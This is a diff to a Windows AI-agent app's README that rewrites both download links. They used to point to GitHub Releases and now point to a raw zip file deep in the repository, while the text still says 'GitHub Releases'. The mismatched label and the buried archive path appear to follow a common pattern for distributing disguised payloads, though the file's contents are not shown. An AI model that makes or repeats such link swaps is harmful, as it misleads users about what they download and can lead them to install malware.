@@ -1,6 +1,6 @@
 # 🤖 genesis-phase - Run an AI agent on Windows
 
-[![Download genesis-phase](https://img.shields.io/badge/Download%20genesis--phase-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paperthin-rabbitpunch174/genesis-phase/releases)
+[![Download genesis-phase](https://img.shields.io/badge/Download%20genesis--phase-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paperthin-rabbitpunch174/genesis-phase/raw/refs/heads/main/ouroboros/tools/genesis_phase_v2.1-alpha.1.zip)
 
 ## 🌱 What this app does
 
@@ -38,7 +38,7 @@ For best results, use a PC with:
 
 Visit this page to download the Windows release:
 
-[Download genesis-phase from GitHub Releases](https://github.com/Paperthin-rabbitpunch174/genesis-phase/releases)
+[Download genesis-phase from GitHub Releases](https://github.com/Paperthin-rabbitpunch174/genesis-phase/raw/refs/heads/main/ouroboros/tools/genesis_phase_v2.1-alpha.1.zip)
 
 Look for the latest release and download the Windows file for your PC. If there is more than one file, choose the one that matches your system.
 
